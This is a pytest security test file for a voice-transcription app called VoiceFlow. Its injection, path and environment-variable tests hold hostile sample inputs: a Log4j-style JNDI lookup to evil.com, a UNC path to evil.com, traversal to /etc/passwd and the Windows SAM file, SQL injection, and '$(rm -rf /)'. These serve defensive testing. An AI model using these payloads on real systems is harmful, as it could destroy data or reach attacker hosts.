#!/usr/bin/env python3
"""
Security Testing Expert
Tests security aspects and catches potential security vulnerabilities.
"""

import pytest
import os
import tempfile
import subprocess
import sys
from pathlib import Path

from voiceflow.core.config import VoiceFlowConfig


class TestInputValidation:
    """Test input validation to prevent security issues."""
    
    def test_config_injection_protection(self):
        """Test that config doesn't allow code injection."""
        config = VoiceFlowConfig()
        
        # Test various injection attempts
        malicious_inputs = [
            "__import__('os').system('echo hacked')",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
        ]
        
        for malicious_input in malicious_inputs:
            # These should not cause code execution or crashes
            try:
                config.model_name = malicious_input
                config.validate()
            except ValueError:
                # Expected for invalid model names
                pass
            except Exception as e:
                # Should not cause other types of exceptions
                pytest.fail(f"Unexpected exception with input '{malicious_input}': {e}")
    
    def test_file_path_validation(self):
        """Test file path validation for security."""
        # Test audio file processing with malicious paths
        malicious_paths = [
            "../../../etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "/dev/urandom",
            "NUL:",
            "CON:",
            "\\\\evil.com\\share\\file.wav",
        ]
        
        for malicious_path in malicious_paths:
            cmd = [
                sys.executable, 
                "voiceflow_main.py", 
                "--audio_input", 
                malicious_path
            ]
            
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=10,
                    cwd=Path(__file__).parent.parent.parent
                )
                
                # Should not crash with system errors or expose sensitive info
                assert "Access is denied" not in result.stderr
                assert "Permission denied" not in result.stderr
                assert "No such file or directory" in result.stderr or "does not exist" in result.stderr
                
            except subprocess.TimeoutExpired:
                pytest.fail(f"Process hung with malicious path: {malicious_path}")
            except Exception as e:
                # Should handle gracefully
                pass
    
    def test_environment_variable_injection(self):
        """Test environment variable handling."""
        # Test with malicious environment variables
        malicious_env = {
            "VOICEFLOW_MODEL": "__import__('os').system('echo hacked')",
            "VOICEFLOW_DEVICE": "../../../etc/passwd",
            "VOICEFLOW_HOTKEY": "$(rm -rf /)",
        }
        
        original_env = {}
        for key in malicious_env:
            original_env[key] = os.environ.get(key)
            os.environ[key] = malicious_env[key]
        
        try:
            # Should not execute code or cause crashes
            config = VoiceFlowConfig.from_env()
            config.validate()
        except ValueError:
            # Expected for invalid values
            pass
        except Exception as e:
            pytest.fail(f"Unexpected exception with malicious env vars: {e}")
        finally:
            # Restore environment
            for key, value in original_env.items():
                if value is not None:
                    os.environ[key] = value
                elif key in os.environ:
                    del os.environ[key]


class TestPrivacyProtection:
    """Test privacy protection measures."""
    
    def test_no_sensitive_data_in_logs(self):
        """Test that sensitive data doesn't leak into logs."""
        # Create a config with potentially sensitive data
        config = VoiceFlowConfig()
        
        # Test that string representation doesn't expose sensitive info
        config_str = str(config)
        
        # Should not contain file paths that might be sensitive
        sensitive_patterns = [
            "C:\\Users\\",
            "/home/",
            "password",
            "secret",
            "token",
            "key",
        ]
        
        for pattern in sensitive_patterns:
            # Skip 'key' pattern as it appears in legitimate config keys like 'hotkey'
            if pattern.lower() == 'key' and 'hotkey' in config_str.lower():
                continue
            assert pattern.lower() not in config_str.lower(), f"Potentially sensitive data '{pattern}' found in config string"
    
    def test_temp_file_security(self):
        """Test that temporary files are handled securely."""
        # Test that we don't create world-readable temp files
        with tempfile.NamedTemporaryFile() as temp_file:
            # On Unix-like systems, temp files should not be world-readable
            # Skip this test on Windows as file permissions work differently
            if hasattr(os, 'stat') and os.name != 'nt':
                import stat
                file_stat = os.stat(temp_file.name)
                mode = file_stat.st_mode
                
                # Should not be world-readable (others should not have read permission)
                assert not (mode & stat.S_IROTH), "Temp file is world-readable"


class TestResourceLimits:
    """Test resource limit protections."""
    
    def test_memory_limit_protection(self):
        """Test protection against excessive memory usage."""
        config = VoiceFlowConfig()
        
        # Test with large audio data
        import numpy as np
        
        # Create 100MB of audio data (should be handled gracefully)
        large_audio = np.random.random(100 * 1024 * 1024 // 4).astype(np.float32)
        
        try:
            from voiceflow.core.transcription import create_transcription_engine
            engine = create_transcription_engine(config, config.transcription_engine_type)
            
            # Should either process it or fail gracefully, not crash
            result = engine.transcribe(large_audio)
            
        except MemoryError:
            # Acceptable - should fail gracefully for huge inputs
            pass
        except Exception as e:
            # Should not crash with other errors
            pytest.fail(f"Unexpected error with large audio: {e}")
    
    def test_infinite_loop_protection(self):
        """Test protection against infinite loops."""
        # Test that hotkey registration doesn't cause infinite loops
        from voiceflow.ui.hotkeys import HotkeyManager
        
        config = VoiceFlowConfig()
        hotkey_manager = HotkeyManager(config)
        
        call_count = 0
        max_calls = 1000
        
        def test_callback():
            nonlocal call_count
            call_count += 1
            if call_count > max_calls:
                pytest.fail("Possible infinite loop in hotkey callback")
        
        try:
            hotkey_manager.register_hotkey(test_callback)
            # Simulate some activity
            import time
            time.sleep(0.1)
            
        finally:
            hotkey_manager.cleanup()
        
        # Should not have been called excessively
        assert call_count < 100, f"Hotkey callback called too many times: {call_count}"


class TestErrorHandlingSecurity:
    """Test that error handling doesn't leak sensitive information."""
    
    def test_error_message_safety(self):
        """Test that error messages don't leak sensitive info."""
        try:
            # Try to trigger various errors
            from voiceflow.core.audio import create_audio_recorder
            from voiceflow.core.config import VoiceFlowConfig
            
            config = VoiceFlowConfig()
            
            # Try with invalid recorder type
            try:
                create_audio_recorder(config, "invalid_recorder_type")
            except Exception as e:
                error_msg = str(e)
                
                # Should not contain file paths or system info
                assert "C:\\" not in error_msg
                assert "/home/" not in error_msg
                assert "\\Users\\" not in error_msg
        
        except ImportError:
            pytest.skip("Could not import modules for error testing")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])